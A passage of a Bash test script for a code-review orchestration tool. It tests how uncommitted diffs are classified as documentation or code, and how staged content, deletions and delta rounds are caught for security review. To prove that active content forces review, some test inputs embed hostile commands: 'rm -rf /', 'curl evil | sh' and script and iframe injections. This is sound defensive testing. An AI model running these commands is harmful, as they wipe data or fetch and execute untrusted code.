check_eq "a plain docs edit over a tracked baseline still skips" \
  "docs-only" "$CLASSIFY_SCOPE"
check_eq "a plain docs edit still skips the security lens" "skip" "$CLASSIFY_SECURITY"

# A path list that cannot be computed is an error, never an empty list.
NOTREPO="$ROOT/not-a-repo"
mkdir -p "$NOTREPO"
classify "$NOTREPO" "$ROOT/nope.scope" "$ROOT/nope.round" 3 >/dev/null 2>&1
check_ne "a diff that cannot be listed is an error" "0" "$?"
if [[ ! -e "$ROOT/nope.scope" ]]; then
  ok "a failed classification writes no scope file"
else
  no "a failed classification writes no scope file" "it wrote $ROOT/nope.scope"
fi

# ...and the case that actually happens in a run: the scope file is ALREADY
# THERE from the previous round. A failed classification must not leave last
# round's decision sitting where the Manager will read it as this round's.
# A stale "skip" reached that way is the same unreviewed-change-looks-reviewed
# failure as a wrong classification, just through the error path.
STALE_SCOPE="$ROOT/stale.scope"
cat > "$STALE_SCOPE" <<'STALE'
round=1
max_rounds=3
final_round=no
scope=docs-only
correctness=skip
security=skip
paths=1
docs_paths=1
first_code_path=
STALE
classify "$NOTREPO" "$STALE_SCOPE" "$ROOT/stale.round" 3 >/dev/null 2>&1
check_ne "a failed classification over an existing scope file still errors" "0" "$?"
if [[ ! -e "$STALE_SCOPE" ]]; then
  ok "a failed classification removes the PREVIOUS round's scope file"
else
  no "a failed classification removes the PREVIOUS round's scope file" \
    "stale scope survived: $(tr '\n' ' ' < "$STALE_SCOPE")"
fi

# The successful write is atomic, so no leftover temp file is left behind for
# something to mistake for a scope file. mktemp names it scope.XXXXXX with six
# random characters; the .delta, .changed and .baseline siblings are real
# outputs of this helper and are excluded by name rather than by pattern, so a
# genuine leftover cannot hide behind a loose glob.
LEFTOVER="$(
  find "$STAGED_DIR" -maxdepth 1 -name 'scope.*' \
    ! -name 'scope.delta' ! -name 'scope.changed' ! -name 'scope.baseline' \
    2>/dev/null | head -n 1 || true
)"
check_eq "a successful classification leaves no temp scope file" "" "${LEFTOVER:-}"

echo ""

# ================================================ index vs worktree divergence ==
#
# The index and the worktree can hold DIFFERENT content for the same path, and
# both of the new mechanisms originally looked only at the worktree. A
# documentation file could be STAGED carrying a <script> and then edited back to
# inert prose, and the classifier - reading only the worktree copy - marked the
# whole round documentation-only and skipped both lenses. The delta had the
# mirror hole: staged content the worktree copy hid was simply absent from it.
#
# The invariant these pin down: nothing that is part of the uncommitted change
# may be invisible to the inertness check or to the delta.
echo "index vs worktree divergence (staged content cannot hide behind the worktree)"

# staged_case <label> <path> <staged-content> <worktree-content>
staged_case() {
  local label="$1" path="$2" staged="$3" worktree="$4"
  SPLIT_DIR="$(mktemp -d "$ROOT/split.XXXXXX")"
  SPLIT_REPO="$SPLIT_DIR/repo"
  mkdir -p "$SPLIT_REPO"
  git_quiet init -q "$SPLIT_REPO" 2>/dev/null
  printf 'committed prose\n' > "$SPLIT_REPO/$path"
  git_quiet -C "$SPLIT_REPO" add -A 2>/dev/null
  git_quiet -C "$SPLIT_REPO" commit -qm init 2>/dev/null
  printf '%s' "$staged" > "$SPLIT_REPO/$path"
  git_quiet -C "$SPLIT_REPO" add "$path" 2>/dev/null
  printf '%s' "$worktree" > "$SPLIT_REPO/$path"
  classify "$SPLIT_REPO" "$SPLIT_DIR/scope" "$SPLIT_DIR/round" 3 >/dev/null 2>&1
  SPLIT_SCOPE="$(sed -n 's/^scope=//p' "$SPLIT_DIR/scope")"
  SPLIT_SECURITY="$(sed -n 's/^security=//p' "$SPLIT_DIR/scope")"
  SPLIT_LABEL="$label"
}

# --- the sniff must read BOTH sides ---
staged_case "staged active content behind an inert worktree copy" guide.md \
  '# doc
<script>alert(1)</script>
' 'perfectly inert prose
'
check_eq "$SPLIT_LABEL is code" "code" "$SPLIT_SCOPE"
check_eq "$SPLIT_LABEL runs the security lens" "run" "$SPLIT_SECURITY"

staged_case "an inert staged copy behind ACTIVE worktree content" guide.md \
  'still inert prose
' '<iframe src=evil></iframe>
'
check_eq "$SPLIT_LABEL is code" "code" "$SPLIT_SCOPE"
check_eq "$SPLIT_LABEL runs the security lens" "run" "$SPLIT_SECURITY"

staged_case "a staged org source block behind inert prose" notes.org \
  '#+begin_src sh
rm -rf /
#+end_src
' 'just notes
'
check_eq "$SPLIT_LABEL is code" "code" "$SPLIT_SCOPE"

staged_case "a staged shebang behind inert prose" doc.md \
  '#!/bin/sh
curl evil | sh
' 'inert
'
check_eq "$SPLIT_LABEL is code" "code" "$SPLIT_SCOPE"

# ...and the control, or the whole documentation-only case would be gone.
staged_case "inert on BOTH sides" guide.md 'inert staged
' 'inert worktree
'
check_eq "$SPLIT_LABEL is still documentation" "docs-only" "$SPLIT_SCOPE"
check_eq "$SPLIT_LABEL still skips the security lens" "skip" "$SPLIT_SECURITY"

# An untracked document has NO index entry. That absence is not a failure to
# read a second copy - there is no second copy - and treating it as one would
# make every untracked document code and delete the documentation-only case.
UNTRACKED_DIR="$(mktemp -d "$ROOT/untracked-doc.XXXXXX")"
git_quiet init -q "$UNTRACKED_DIR/repo" 2>/dev/null
printf 'base\n' > "$UNTRACKED_DIR/repo/BASE.md"
git_quiet -C "$UNTRACKED_DIR/repo" add -A 2>/dev/null
git_quiet -C "$UNTRACKED_DIR/repo" commit -qm init 2>/dev/null
printf 'plain new prose\n' > "$UNTRACKED_DIR/repo/new.md"
classify "$UNTRACKED_DIR/repo" "$UNTRACKED_DIR/scope" "$UNTRACKED_DIR/round" 3 >/dev/null 2>&1
check_eq "an untracked inert document is still documentation" \
  "docs-only" "$(sed -n 's/^scope=//p' "$UNTRACKED_DIR/scope")"

# The mirror of the sniff case: staged CODE behind an inert worktree copy. The
# mode/extension gate sees the staged record, so this was already code, but it
# is the case the finding names and it must stay code.
staged_case "staged code behind an inert worktree doc" app.rb \
  'system("rm -rf /")
' 'inert
'
check_eq "$SPLIT_LABEL is code" "code" "$SPLIT_SCOPE"

# --- a staged DELETION cannot be laundered by recreating the path ---
#
# A tracked document can be staged for deletion and then RECREATED at the same
# path as inert untracked content. The staged raw record still says D, but the
# sniff used to read the recreated worktree file, find no stage-0 index entry,
# and hand back documentation-only - breaking both the "a deleted document is
# unvouchable" invariant and the untracked exception at once.
DEL_DIR="$(mktemp -d "$ROOT/staged-del.XXXXXX")"
DEL_REPO="$DEL_DIR/repo"
mkdir -p "$DEL_REPO"
git_quiet init -q "$DEL_REPO" 2>/dev/null
printf '# doc\n<script>alert(1)</script>\n' > "$DEL_REPO/guide.md"
git_quiet -C "$DEL_REPO" add -A 2>/dev/null
git_quiet -C "$DEL_REPO" commit -qm init 2>/dev/null
git_quiet -C "$DEL_REPO" rm -q --cached guide.md 2>/dev/null
printf 'perfectly inert prose\n' > "$DEL_REPO/guide.md"
classify "$DEL_REPO" "$DEL_DIR/scope" "$DEL_DIR/round" 3 >/dev/null 2>&1
check_eq "a staged deletion recreated as inert untracked content is code" \
  "code" "$(sed -n 's/^scope=//p' "$DEL_DIR/scope")"
check_eq "and it runs the security lens" \
  "run" "$(sed -n 's/^security=//p' "$DEL_DIR/scope")"
check_eq "the recreated path is named as the code path" \
  "guide.md" "$(sed -n 's/^first_code_path=//p' "$DEL_DIR/scope")"

# The same shape with an ORIGINAL that was itself inert: it is the deletion that
# makes this unvouchable, not what the deleted content happened to contain.
DEL2_DIR="$(mktemp -d "$ROOT/staged-del2.XXXXXX")"
DEL2_REPO="$DEL2_DIR/repo"
mkdir -p "$DEL2_REPO"
git_quiet init -q "$DEL2_REPO" 2>/dev/null
printf 'plain prose\n' > "$DEL2_REPO/guide.md"
git_quiet -C "$DEL2_REPO" add -A 2>/dev/null
git_quiet -C "$DEL2_REPO" commit -qm init 2>/dev/null
git_quiet -C "$DEL2_REPO" rm -q --cached guide.md 2>/dev/null
printf 'other inert prose\n' > "$DEL2_REPO/guide.md"
classify "$DEL2_REPO" "$DEL2_DIR/scope" "$DEL2_DIR/round" 3 >/dev/null 2>&1
check_eq "an inert document staged-deleted and recreated is still code" \
  "code" "$(sed -n 's/^scope=//p' "$DEL2_DIR/scope")"

# ...and the untracked exception must survive all of that, or the whole
# documentation-only case is gone.
check_eq "an ordinary untracked document is still documentation" \
  "docs-only" "$(sed -n 's/^scope=//p' "$UNTRACKED_DIR/scope")"

# --- the delta must cover index content too ---
#
# Staging a change and putting the worktree copy back to the already-reviewed
# text produced a delta that omitted the staged content while the uncommitted
# change still carried it.
HID_DIR="$(mktemp -d "$ROOT/hidden.XXXXXX")"
HID_REPO="$HID_DIR/repo"
mkdir -p "$HID_REPO"
git_quiet init -q "$HID_REPO" 2>/dev/null
printf 'v1\n' > "$HID_REPO/app.rb"
printf 'w1\n' > "$HID_REPO/other.rb"
git_quiet -C "$HID_REPO" add -A 2>/dev/null
git_quiet -C "$HID_REPO" commit -qm init 2>/dev/null
printf 'v2 reviewed in round 1\n' > "$HID_REPO/app.rb"
classify "$HID_REPO" "$HID_DIR/scope" "$HID_DIR/round" 3 "$HID_DIR/baseline" >/dev/null 2>&1
"$CAPTURE" "$HID_REPO" "$HID_DIR/baseline" 1 >/dev/null 2>&1
# A genuine worktree fix, so delta mode engages at all...
printf 'w2 a genuine fix\n' > "$HID_REPO/other.rb"
# ...and a backdoor staged, then hidden behind the already-reviewed worktree text.
printf 'v3 STAGED BACKDOOR\n' > "$HID_REPO/app.rb"
git_quiet -C "$HID_REPO" add app.rb 2>/dev/null
printf 'v2 reviewed in round 1\n' > "$HID_REPO/app.rb"
classify "$HID_REPO" "$HID_DIR/scope" "$HID_DIR/round" 3 "$HID_DIR/baseline" >/dev/null 2>&1
check_eq "the hidden-staged round still deltas" "delta" \
  "$(sed -n 's/^review_mode=//p' "$HID_DIR/scope")"
check_contains "the delta carries the genuine worktree fix" \
  "$(cat "$HID_DIR/scope.delta")" "w2 a genuine fix"
check_contains "the delta carries the STAGED content the worktree hid" \
  "$(cat "$HID_DIR/scope.delta")" "STAGED BACKDOOR"

# A fix that was staged and NOT left in the worktree is real work: it must count
# as a non-empty delta rather than falling back to a full re-read.
ONLY_DIR="$(mktemp -d "$ROOT/stagedonly.XXXXXX")"
ONLY_REPO="$ONLY_DIR/repo"
mkdir -p "$ONLY_REPO"
git_quiet init -q "$ONLY_REPO" 2>/dev/null
printf 'v1\n' > "$ONLY_REPO/app.rb"
git_quiet -C "$ONLY_REPO" add -A 2>/dev/null
git_quiet -C "$ONLY_REPO" commit -qm init 2>/dev/null
printf 'v2 reviewed\n' > "$ONLY_REPO/app.rb"
classify "$ONLY_REPO" "$ONLY_DIR/scope" "$ONLY_DIR/round" 3 "$ONLY_DIR/baseline" >/dev/null 2>&1
"$CAPTURE" "$ONLY_REPO" "$ONLY_DIR/baseline" 1 >/dev/null 2>&1
printf 'v3 staged fix only\n' > "$ONLY_REPO/app.rb"
git_quiet -C "$ONLY_REPO" add app.rb 2>/dev/null
printf 'v2 reviewed\n' > "$ONLY_REPO/app.rb"
classify "$ONLY_REPO" "$ONLY_DIR/scope" "$ONLY_DIR/round" 3 "$ONLY_DIR/baseline" >/dev/null 2>&1
check_eq "a staged-only fix still produces a delta" "delta" \
  "$(sed -n 's/^review_mode=//p' "$ONLY_DIR/scope")"
check_contains "the staged-only fix is in the delta" \
  "$(cat "$ONLY_DIR/scope.delta")" "staged fix only"

# --- an index that MOVED since the review must show up ---
#
# A fix that was staged when the previous round reviewed it can be reset back to
# HEAD afterwards. The worktree still holds it, so the worktree diff says
# nothing, and it is not staged against HEAD any more, so the staged-vs-HEAD
# rule says nothing either. The reference point that does work is the index AS
# IT WAS AT THE LAST REVIEW - git stash create records it as the baseline
# commit's second parent - because an index that has moved since a lens looked
# at it is exactly the event worth showing.
REV_DIR="$(mktemp -d "$ROOT/reverted.XXXXXX")"
REV_REPO="$REV_DIR/repo"
mkdir -p "$REV_REPO"
git_quiet init -q "$REV_REPO" 2>/dev/null
printf 'v1\n' > "$REV_REPO/app.rb"
printf 'w1\n' > "$REV_REPO/other.rb"
git_quiet -C "$REV_REPO" add -A 2>/dev/null
git_quiet -C "$REV_REPO" commit -qm init 2>/dev/null
# Round 1 reviews the fix, and the fix is STAGED at that moment.
printf 'v2 THE REVIEWED FIX\n' > "$REV_REPO/app.rb"
git_quiet -C "$REV_REPO" add app.rb 2>/dev/null
classify "$REV_REPO" "$REV_DIR/scope" "$REV_DIR/round" 3 "$REV_DIR/baseline" >/dev/null 2>&1
"$CAPTURE" "$REV_REPO" "$REV_DIR/baseline" 1 >/dev/null 2>&1
# Round 2: the index is reset back to HEAD, quietly dropping the reviewed fix
# from what would be committed. Another path changes so delta mode stays on.
git_quiet -C "$REV_REPO" reset -q HEAD -- app.rb 2>/dev/null
printf 'w2 an unrelated change\n' > "$REV_REPO/other.rb"
classify "$REV_REPO" "$REV_DIR/scope" "$REV_DIR/round" 3 "$REV_DIR/baseline" >/dev/null 2>&1
check_eq "the reverted-index round still deltas" "delta" \
  "$(sed -n 's/^review_mode=//p' "$REV_DIR/scope")"
check_contains "the delta carries the unrelated change that kept it engaged" \
  "$(cat "$REV_DIR/scope.delta")" "w2 an unrelated change"
check_contains "the delta shows the reviewed fix leaving the index" \
  "$(cat "$REV_DIR/scope.delta")" "THE REVIEWED FIX"
check_contains "the delta names the path whose index moved" \
  "$(cat "$REV_DIR/scope.delta")" "a/app.rb"

# ...and an ORDINARY unstaged round must not gain a reverse diff back to the
# committed text. Without the staged-vs-HEAD filter every delta doubled and told
# the lens a reversion had happened that had not.
QUIET_DIR="$(mktemp -d "$ROOT/quiet.XXXXXX")"
QUIET_REPO="$QUIET_DIR/repo"
mkdir -p "$QUIET_REPO"
git_quiet init -q "$QUIET_REPO" 2>/dev/null
printf 'v1\n' > "$QUIET_REPO/app.rb"
git_quiet -C "$QUIET_REPO" add -A 2>/dev/null
git_quiet -C "$QUIET_REPO" commit -qm init 2>/dev/null
printf 'v2 reviewed\n' > "$QUIET_REPO/app.rb"
classify "$QUIET_REPO" "$QUIET_DIR/scope" "$QUIET_DIR/round" 3 "$QUIET_DIR/baseline" >/dev/null 2>&1
"$CAPTURE" "$QUIET_REPO" "$QUIET_DIR/baseline" 1 >/dev/null 2>&1
printf 'v3 plain unstaged fix\n' > "$QUIET_REPO/app.rb"
classify "$QUIET_REPO" "$QUIET_DIR/scope" "$QUIET_DIR/round" 3 "$QUIET_DIR/baseline" >/dev/null 2>&1
check_contains "an ordinary delta carries the fix" \
  "$(cat "$QUIET_DIR/scope.delta")" "v3 plain unstaged fix"
check_absent "an ordinary delta gains no reverse diff to the committed text" \
  "$(cat "$QUIET_DIR/scope.delta")" "+v1"
check_eq "an ordinary delta contains exactly one file header" "1" \
  "$(grep -c '^diff --git' "$QUIET_DIR/scope.delta")"

echo ""

# ========================================================== delta review scope ==
#
# Round 1 is the real review and always reads the full uncommitted diff. Later
# rounds exist to confirm that findings were fixed and that the fix broke
# nothing, so they read only what changed since the state the previous round
# reviewed. One lens run costs roughly 360k input tokens, nearly all of it the
# lens reading the diff and exploring the repo, so this is where the money is.
#
# Every assertion below is really about ONE property: no path through this code
# reviews LESS than the whole change unless a real delta was computed. Each
# fallback is checked separately because each one is a separate way to lose a
# review without anyone noticing.
echo "delta review scope (round 1 full, round 2+ delta, every failure widens)"

# delta_repo <dir> - a repository with a committed baseline and uncommitted work
# on top, which is the state every review round actually runs against.
delta_repo() {
  DELTA_DIR="$(mktemp -d "$ROOT/delta.XXXXXX")"
  DELTA_REPO="$DELTA_DIR/repo"
  mkdir -p "$DELTA_REPO"
  git_quiet init -q "$DELTA_REPO" 2>/dev/null
  printf 'v1\n' > "$DELTA_REPO/app.rb"
  printf 'docs\n' > "$DELTA_REPO/README.md"
  git_quiet -C "$DELTA_REPO" add -A 2>/dev/null
  git_quiet -C "$DELTA_REPO" commit -qm init 2>/dev/null
  printf 'v2 with a bug\n' > "$DELTA_REPO/app.rb"
}

delta_classify() {
  classify "$DELTA_REPO" "$DELTA_DIR/scope" "$DELTA_DIR/round" 3 "$DELTA_DIR/baseline" \
    >/dev/null 2>&1
  DELTA_MODE="$(sed -n 's/^review_mode=//p' "$DELTA_DIR/scope")"
  DELTA_WHY="$(sed -n 's/^review_scope_reason=//p' "$DELTA_DIR/scope")"
}

# --- round 1 is always full, even with a stale baseline file lying around ---
delta_repo
printf 'deadbeefdeadbeefdeadbeefdeadbeefdeadbeef\n' > "$DELTA_DIR/baseline"
delta_classify
check_eq "round 1 reviews the full diff" "full" "$DELTA_MODE"
check_contains "round 1 says why it is full" "$DELTA_WHY" "the first review of a run"

# The case above cannot tell "round 1 is forced full" apart from "the corrupt
# baseline fell back to full", because both end at full. So repeat it with a
# GENUINELY USABLE baseline: round 1 must still refuse to delta, and must say it
# is because it is round 1 rather than because anything failed.
delta_repo
"$CAPTURE" "$DELTA_REPO" "$DELTA_DIR/baseline" 1 >/dev/null 2>&1
printf 'v9 changed since that baseline\n' > "$DELTA_REPO/app.rb"
delta_classify
check_eq "round 1 ignores even a VALID baseline" "full" "$DELTA_MODE"
check_contains "round 1 is full because it is round 1, not because of a failure" \
  "$DELTA_WHY" "the first review of a run"
if [[ ! -e "$DELTA_DIR/scope.delta" ]]; then
  ok "round 1 writes no delta file"
else
  no "round 1 writes no delta file" "it wrote one"
fi

# --- round 2 reviews the delta since round 1's baseline ---
delta_repo
delta_classify                                     # round 1
"$CAPTURE" "$DELTA_REPO" "$DELTA_DIR/baseline" 1 >/dev/null 2>&1
check_eq "capture-review-baseline succeeds" "0" "$?"
check_file "the baseline file is written" "$DELTA_DIR/baseline"
printf 'v3 fixed\n' > "$DELTA_REPO/app.rb"          # the Coder's fix
delta_classify                                     # round 2
check_eq "round 2 reviews only the delta" "delta" "$DELTA_MODE"
check_file "round 2 writes a delta file" "$DELTA_DIR/scope.delta"
DELTA_BODY="$(cat "$DELTA_DIR/scope.delta")"
check_contains "the delta carries the fix" "$DELTA_BODY" "+v3 fixed"
check_contains "the delta carries what the fix replaced" "$DELTA_BODY" "-v2 with a bug"
check_absent "the delta does NOT re-send the already-reviewed original" \
  "$DELTA_BODY" "-v1"

# --- the full changed-file NAME list reaches the lens even in a delta round ---
check_file "a delta round still writes the changed-file list" "$DELTA_DIR/scope.changed"
CHANGED_BODY="$(cat "$DELTA_DIR/scope.changed")"
check_contains "the name list covers the whole change, not just the delta" \
  "$CHANGED_BODY" "app.rb"
check_contains "the scope file points the Manager at the name list" \
  "$(cat "$DELTA_DIR/scope")" "changed_files_file="
check_contains "the scope file points the Manager at the delta" \
  "$(cat "$DELTA_DIR/scope")" "delta_file="

# --- a brand new UNTRACKED file must not vanish from a delta round ---
#
# git stash create does not record untracked files, so `git diff <baseline>`
# alone would not show one. This is the single most dangerous detail in the
# feature: a new source file the Coder just wrote would be invisible.
delta_repo
delta_classify
"$CAPTURE" "$DELTA_REPO" "$DELTA_DIR/baseline" 1 >/dev/null 2>&1
printf 'v3\n' > "$DELTA_REPO/app.rb"
printf 'brand new secret handling\n' > "$DELTA_REPO/newly_added.rb"
delta_classify
check_eq "a round with a new untracked file still deltas" "delta" "$DELTA_MODE"
check_contains "a brand new untracked file IS in the delta" \
  "$(cat "$DELTA_DIR/scope.delta")" "newly_added.rb"
check_contains "the new untracked file is in the changed-file list too" \
  "$(cat "$DELTA_DIR/scope.changed")" "newly_added.rb"

# --- every fallback widens back to the full diff ---
delta_fallback() {
  local label="$1"
  delta_classify
  check_eq "$label falls back to the full diff" "full" "$DELTA_MODE"
}

delta_repo; delta_classify
"$CAPTURE" "$DELTA_REPO" "$DELTA_DIR/baseline" 1 >/dev/null 2>&1
printf 'v3\n' > "$DELTA_REPO/app.rb"
rm -f "$DELTA_DIR/baseline"
delta_fallback "a MISSING baseline"

delta_repo; delta_classify
"$CAPTURE" "$DELTA_REPO" "$DELTA_DIR/baseline" 1 >/dev/null 2>&1
printf 'v3\n' > "$DELTA_REPO/app.rb"
: > "$DELTA_DIR/baseline"
delta_fallback "an EMPTY baseline file"

delta_repo; delta_classify
"$CAPTURE" "$DELTA_REPO" "$DELTA_DIR/baseline" 1 >/dev/null 2>&1
printf 'v3\n' > "$DELTA_REPO/app.rb"
printf 'not-a-sha-at-all\n' > "$DELTA_DIR/baseline"
delta_fallback "a CORRUPT baseline"

delta_repo; delta_classify
"$CAPTURE" "$DELTA_REPO" "$DELTA_DIR/baseline" 1 >/dev/null 2>&1
printf 'v3\n' > "$DELTA_REPO/app.rb"
printf 'deadbeefdeadbeefdeadbeefdeadbeefdeadbeef\n' > "$DELTA_DIR/baseline"
delta_fallback "a baseline that is NOT AN OBJECT in this repo"
check_contains "the non-object fallback says why" "$DELTA_WHY" "is not a commit in this repository"

# An EMPTY delta means no fix landed where the baseline can see it. Silence is
# not a pass: re-read everything.
delta_repo; delta_classify
"$CAPTURE" "$DELTA_REPO" "$DELTA_DIR/baseline" 1 >/dev/null 2>&1
delta_fallback "an EMPTY delta (the Coder changed nothing)"
check_contains "the empty-delta fallback says why" "$DELTA_WHY" "came back EMPTY"

# The emptiness test must survive untracked padding. Untracked files are
# appended to every delta, so testing emptiness AFTER appending them would mean
# the signal never fires.
delta_repo
printf 'stray\n' > "$DELTA_REPO/untracked_stays.rb"
delta_classify
"$CAPTURE" "$DELTA_REPO" "$DELTA_DIR/baseline" 1 >/dev/null 2>&1
delta_fallback "an empty delta with an untracked file present"

# A change that creates ONLY a new untracked file leaves the tracked diff empty.
# Re-reading the full diff is the safe answer there too.
delta_repo; delta_classify
"$CAPTURE" "$DELTA_REPO" "$DELTA_DIR/baseline" 1 >/dev/null 2>&1
printf 'new\n' > "$DELTA_REPO/only_new.rb"
delta_fallback "a round where ONLY a new untracked file appeared"

# --- the skip decision is still computed on the FULL change ---
#
# A documentation-only delta sitting on top of a code change must still run the
# security lens. This is deliberately the expensive direction.
delta_repo; delta_classify
"$CAPTURE" "$DELTA_REPO" "$DELTA_DIR/baseline" 1 >/dev/null 2>&1
printf 'more docs\n' >> "$DELTA_REPO/README.md"
delta_classify
check_eq "a docs-only delta still deltas" "delta" "$DELTA_MODE"
check_eq "a docs-only delta on top of a code change still runs security" \
  "run" "$(sed -n 's/^security=//p' "$DELTA_DIR/scope")"
check_eq "the skip decision still sees the whole change as code" \
  "code" "$(sed -n 's/^scope=//p' "$DELTA_DIR/scope")"

# --- capturing a baseline must not disturb live agent work ---
#
# This runs while Coder has edits in flight, so it must not touch the working
# tree, what is staged, or the stash list. git DOES rewrite the .git/index file
# to refresh its cached stat data; what must not change is the index CONTENT,
# which is what these three assertions measure.
delta_repo
printf 'staged\n' > "$DELTA_REPO/staged.rb"
git_quiet -C "$DELTA_REPO" add staged.rb 2>/dev/null
printf 'untracked\n' > "$DELTA_REPO/untracked.rb"
git_quiet -C "$DELTA_REPO" status --porcelain >/dev/null 2>&1
ST_BEFORE="$(git_quiet -C "$DELTA_REPO" status --porcelain 2>/dev/null)"
LS_BEFORE="$(git_quiet -C "$DELTA_REPO" ls-files -s 2>/dev/null)"
CACHED_BEFORE="$(git_quiet -C "$DELTA_REPO" diff --cached 2>/dev/null)"
UNSTAGED_BEFORE="$(git_quiet -C "$DELTA_REPO" diff 2>/dev/null)"
STASH_BEFORE="$(git_quiet -C "$DELTA_REPO" stash list 2>/dev/null | wc -l | tr -d '[:space:]')"
APP_BEFORE="$(cat "$DELTA_REPO/app.rb")"
"$CAPTURE" "$DELTA_REPO" "$DELTA_DIR/baseline" 1 >/dev/null 2>&1
check_eq "capturing a baseline leaves the working tree status untouched" \
  "$ST_BEFORE" "$(git_quiet -C "$DELTA_REPO" status --porcelain 2>/dev/null)"
check_eq "capturing a baseline leaves the index CONTENT untouched" \
  "$LS_BEFORE" "$(git_quiet -C "$DELTA_REPO" ls-files -s 2>/dev/null)"
check_eq "capturing a baseline leaves the staged diff untouched" \
  "$CACHED_BEFORE" "$(git_quiet -C "$DELTA_REPO" diff --cached 2>/dev/null)"
check_eq "capturing a baseline leaves the unstaged diff untouched" \
  "$UNSTAGED_BEFORE" "$(git_quiet -C "$DELTA_REPO" diff 2>/dev/null)"
check_eq "capturing a baseline leaves the stash list untouched" \
  "$STASH_BEFORE" "$(git_quiet -C "$DELTA_REPO" stash list 2>/dev/null | wc -l | tr -d '[:space:]')"
check_eq "capturing a baseline leaves file contents untouched" \
  "$APP_BEFORE" "$(cat "$DELTA_REPO/app.rb")"

# A failed capture must leave NO baseline behind, so the next round reads full
# rather than deltaing against a stale sha.
delta_repo
"$CAPTURE" "$DELTA_REPO" "$DELTA_DIR/baseline" 1 >/dev/null 2>&1
check_file "a good capture writes a baseline" "$DELTA_DIR/baseline"
NOTREPO_CAP="$ROOT/capture-not-a-repo"
mkdir -p "$NOTREPO_CAP"
"$CAPTURE" "$NOTREPO_CAP" "$DELTA_DIR/baseline" 2 >/dev/null 2>&1
check_ne "capturing outside a repository fails" "0" "$?"
if [[ ! -e "$DELTA_DIR/baseline" ]]; then
  ok "a failed capture removes the previous baseline"
else
  no "a failed capture removes the previous baseline" "a stale baseline survived"
fi

# --- a resume forces the next review back to full ---
#
# squad resume deletes the baseline outright. A resumed Manager has lost the
# conversation it built its judgement in, so handing it a small delta plus
# "the findings from last round" it can no longer see is where a delta review is
# weakest. The rule is enforced by construction, not by luck.
check_contains "squad resume drops the review baseline" \
  "$(grep -A 2 'Drop the review baseline' "$SQUAD" | head -20)" "review baseline"
# shellcheck disable=SC2016  # matching squad's literal source text, not expanding it.
RESUME_DROP="$(grep -c 'rm -f "\$SQUAD_DIR/review-baseline.txt"' "$SQUAD")"
check_eq "squad deletes the baseline file on resume" "1" "$RESUME_DROP"
# ...and with no baseline present, the next classification is full, whatever
# round number the resumed run is on.
delta_repo
delta_classify; delta_classify          # advance to round 2 with no baseline
check_eq "after a resume with no baseline the next review is full" "full" "$DELTA_MODE"
check_contains "the resumed round says why it is full" "$DELTA_WHY" "no review baseline was recorded"

echo ""

# =============================================================== the round cap ==
echo "the review round cap (counted in a file, not in the Manager's head)"

CAP_DIR="$(mktemp -d "$ROOT/cap.XXXXXX")"
git_quiet init -q "$CAP_DIR/repo" 2>/dev/null
git_quiet -C "$CAP_DIR/repo" commit -q --allow-empty -m init 2>/dev/null
printf 'x\n' > "$CAP_DIR/repo/app.rb"
for want_round in 1 2 3; do
  classify "$CAP_DIR/repo" "$CAP_DIR/scope" "$CAP_DIR/round" 3 >/dev/null 2>&1
  check_eq "classify-diff counts review round $want_round" \
    "$want_round" "$(sed -n 's/^round=//p' "$CAP_DIR/scope")"
done
check_eq "the third of three rounds is the final one" \
  "yes" "$(sed -n 's/^final_round=//p' "$CAP_DIR/scope")"

CAP_OUT="$(classify "$CAP_DIR/repo" "$CAP_DIR/scope" "$CAP_DIR/round" 3 2>&1)"
check_contains "the final round says so on the pane" "$CAP_OUT" "LAST review round allowed"

# SQUAD_REVIEW_MAX_ROUNDS is validated in the same idiom, with the same message
# shape and the same exit behaviour, as SQUAD_WAIT_TIMEOUT_SECONDS.
for bad_value in 0 -1 abc 2.5 " " 03x; do
  BAD_OUT="$(SQUAD_REVIEW_MAX_ROUNDS="$bad_value" "$SQUAD" gen-helpers "$ROOT/gen-bad" 2>&1)"
  BAD_RC=$?
  check_eq "SQUAD_REVIEW_MAX_ROUNDS rejects [$bad_value]" "1" "$BAD_RC"
  check_contains "SQUAD_REVIEW_MAX_ROUNDS [$bad_value] says why" \
    "$BAD_OUT" "Error: SQUAD_REVIEW_MAX_ROUNDS must be a positive integer."
done

# An EMPTY value is "unset", exactly as it is for SQUAD_WAIT_TIMEOUT_SECONDS.
# Same idiom, same behaviour: it falls back to the default rather than failing.
SQUAD_REVIEW_MAX_ROUNDS="" "$SQUAD" gen-helpers "$ROOT/gen-empty-cap" >/dev/null 2>&1
check_eq "an empty SQUAD_REVIEW_MAX_ROUNDS falls back to the default" "0" "$?"
check_contains "the default cap is 3 rounds" \
  "$(cat "$ROOT/gen-empty-cap/manager-prompt.md")" "HARD cap of 3 review rounds"

GOOD_OUT="$(SQUAD_REVIEW_MAX_ROUNDS=7 "$SQUAD" gen-helpers "$ROOT/gen-7" 2>&1)"
check_eq "SQUAD_REVIEW_MAX_ROUNDS accepts a positive integer" "0" "$?"
check_contains "the cap reaches the Manager prompt" \
  "$(cat "$ROOT/gen-7/manager-prompt.md")" "HARD cap of 7 review rounds"
check_absent "gen-helpers with a good cap says nothing about an error" \
  "$GOOD_OUT" "must be a positive integer"

check_contains "the cap is documented in the usage text" \
  "$("$SQUAD" --help 2>&1)" "SQUAD_REVIEW_MAX_ROUNDS"

echo ""

# ======================================================== merge-reviews merging ==
echo "merge-reviews (skipped and carried lenses, and the loud failures)"

MERGE="$GEN/merge-reviews"
WRITE="$GEN/write-lens-result"

fresh_pass() {
  printf '{"verdict":"pass","summary":"%s","must_fix":[],"should_fix":[],"test_gaps":[]}\n' "$1"
}

# The ordinary case first: two fresh passes must look exactly as they always did.
M="$ROOT/merge-fresh"
mkdir -p "$M"
fresh_pass "Nothing wrong." > "$M/c.json"; printf '0\n' > "$M/c.status"
fresh_pass "Nothing wrong." > "$M/s.json"; printf '0\n' > "$M/s.status"
"$MERGE" "$M/c.json" "$M/c.status" "$M/s.json" "$M/s.status" "$M/out.json" "$M/out.status" >/dev/null 2>&1
check_eq "two fresh lenses merge with status 0" "0" "$(cat "$M/out.status")"
check_absent "two fresh lenses produce no lens-states line" \
  "$(jq -r '.summary' "$M/out.json")" "[lens states]"

# A SKIPPED lens.
M="$ROOT/merge-skip"
mkdir -p "$M"
fresh_pass "Nothing wrong." > "$M/c.json"; printf '0\n' > "$M/c.status"
"$WRITE" security skipped "$M/s.json" "$M/s.status" 1 'docs/media-only diff per review-scope.txt' >/dev/null 2>&1
check_eq "write-lens-result writes a skipped lens" "0" "$?"
check_eq "a skipped lens records status 0" "0" "$(cat "$M/s.status")"
